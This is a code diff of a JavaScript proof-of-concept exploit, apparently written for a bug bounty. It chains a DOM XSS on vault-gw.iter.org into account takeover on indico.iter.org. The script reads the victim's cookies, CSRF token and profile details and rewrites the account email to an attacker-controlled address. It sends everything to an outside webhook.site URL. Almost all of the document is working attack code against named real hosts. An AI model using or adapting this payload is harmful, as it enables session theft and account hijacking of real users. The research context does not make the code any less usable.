@@ -1,5 +1,6 @@
 (function () {
   var WEBHOOK = 'https://webhook.site/d4a92c22-be5c-4ee4-86c1-70ac738e3d61';
+  var EVIL_EMAIL = 'brycewhitney.infosec+pwned@gmail.com';
   var cookies = document.cookie;
 
   fetch('https://indico.iter.org/user/profile/', {
@@ -9,51 +10,73 @@
     .then(function (html) {
       var g = function (re) { var m = html.match(re); return m ? m[1] : null; };
 
-      var csrf = g(/csrfToken["':\s]+["']([^"']+)["']/)
-        || g(/"csrf_token":\s*"([^"]+)"/)
-        || g(/name="csrf_token"[^>]*value="([^"]+)"/)
-        || g(/meta[^>]*csrf[^>]*content="([^"]+)"/i);
-
+      var csrf = g(/name="csrf-token"[^>]*content="([^"]+)"/)
+        || g(/name="csrf_token"[^>]*value="([^"]+)"/);
       var email = g(/name="email"[^>]*value="([^"]+)"/)
-        || g(/"email":\s*"([^"]+)"/)
-        || g(/email['"]\s*:\s*['"]([\w.+-]+@[\w.-]+)['"]/);
-
+        || g(/"email":\s*"([^"]+)"/);
       var firstName = g(/name="first_name"[^>]*value="([^"]+)"/)
         || g(/"first_name":\s*"([^"]+)"/);
-
       var lastName = g(/name="last_name"[^>]*value="([^"]+)"/)
         || g(/"last_name":\s*"([^"]+)"/);
-
       var affiliation = g(/name="affiliation"[^>]*value="([^"]+)"/)
         || g(/"affiliation":\s*"([^"]+)"/);
 
-      var phone = g(/name="phone"[^>]*value="([^"]+)"/)
-        || g(/"phone":\s*"([^"]+)"/);
-
-      var titleMatch = html.match(/<title>([^<]+)<\/title>/i);
-      var who = titleMatch ? titleMatch[1].trim() : null;
-
-      report({
-        chain: 'domxss-to-indico-cors',
+      var evidence = {
+        chain: 'domxss-to-indico-ato',
         origin: location.origin,
         cookies: cookies,
         csrf: csrf,
-        user: who,
-        email: email,
+        email_before: email,
         first_name: firstName,
         last_name: lastName,
-        affiliation: affiliation,
-        phone: phone,
-        html_start: html.substring(0, 3000)
-      });
+        affiliation: affiliation
+      };
+
+      if (!csrf || !email) {
+        evidence.error = 'missing csrf or email';
+        report(evidence);
+        return;
+      }
+
+      var attackPayload = 'csrf_token=' + encodeURIComponent(csrf)
+        + '&first_name=' + encodeURIComponent(firstName || '')
+        + '&last_name=' + encodeURIComponent(lastName || '')
+        + '&email=' + encodeURIComponent(EVIL_EMAIL)
+        + '&affiliation=' + encodeURIComponent('HACKED-VIA-XSS');
+
+      fetch('https://indico.iter.org/user/profile/', {
+        method: 'POST',
+        credentials: 'include',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: attackPayload
+      })
+        .then(function (r) { return r.text(); })
+        .then(function (html2) {
+          var newEmail = html2.match(/name="email"[^>]*value="([^"]+)"/);
+          var newAff = html2.match(/name="affiliation"[^>]*value="([^"]+)"/);
+          evidence.email_after = newEmail ? newEmail[1] : '(check profile)';
+          evidence.affiliation_after = newAff ? newAff[1] : '(check profile)';
+          evidence.email_changed = evidence.email_after === EVIL_EMAIL;
+
+          var revert = 'csrf_token=' + encodeURIComponent(csrf)
+            + '&first_name=' + encodeURIComponent(firstName || '')
+            + '&last_name=' + encodeURIComponent(lastName || '')
+            + '&email=' + encodeURIComponent(email)
+            + '&affiliation=' + encodeURIComponent(affiliation || 'YesWeHack');
+
+          fetch('https://indico.iter.org/user/profile/', {
+            method: 'POST',
+            credentials: 'include',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: revert
+          }).then(function () {
+            evidence.reverted = true;
+            report(evidence);
+          });
+        });
     })
     .catch(function (err) {
-      report({
-        chain: 'domxss-cookie-theft',
-        origin: location.origin,
-        cookies: cookies,
-        error: err.message
-      });
+      report({ chain: 'error', origin: location.origin, cookies: cookies, error: err.message });
     });
 
   function report(ev) {
@@ -61,16 +84,13 @@
     b.style.cssText = 'position:fixed;top:0;left:0;right:0;z-index:999999;'
       + 'background:#b00;color:#fff;margin:0;padding:16px;font:13px/1.6 monospace;'
       + 'max-height:50vh;overflow:auto';
-    b.textContent = 'PoC: vault-gw.iter.org DOM XSS\n'
-      + 'Chain: ' + ev.chain + '\n'
-      + 'Origin: ' + ev.origin + '\n'
-      + 'Cookies: ' + (ev.cookies || '(none)').slice(0, 80) + '\n'
-      + (ev.csrf ? 'CSRF: ' + ev.csrf + '\n' : '')
-      + (ev.email ? 'Email: ' + ev.email + '\n' : '')
-      + (ev.first_name ? 'Name: ' + ev.first_name + ' ' + (ev.last_name || '') + '\n' : '')
-      + (ev.affiliation ? 'Affiliation: ' + ev.affiliation + '\n' : '')
-      + (ev.phone ? 'Phone: ' + ev.phone + '\n' : '')
-      + (ev.user ? 'Page: ' + ev.user + '\n' : '');
+    b.textContent = 'PoC: vault-gw DOM XSS → Indico Account Takeover\n'
+      + 'CSRF: ' + (ev.csrf || 'n/a') + '\n'
+      + 'Email before: ' + (ev.email_before || 'n/a') + '\n'
+      + 'Email after:  ' + (ev.email_after || 'n/a') + '\n'
+      + 'Email changed: ' + (ev.email_changed ? 'YES' : 'no') + '\n'
+      + 'Affiliation: ' + (ev.affiliation_after || 'n/a') + '\n'
+      + (ev.reverted ? 'Reverted: yes' : '');
     document.body.appendChild(b);
     navigator.sendBeacon(WEBHOOK, JSON.stringify(ev));
   }
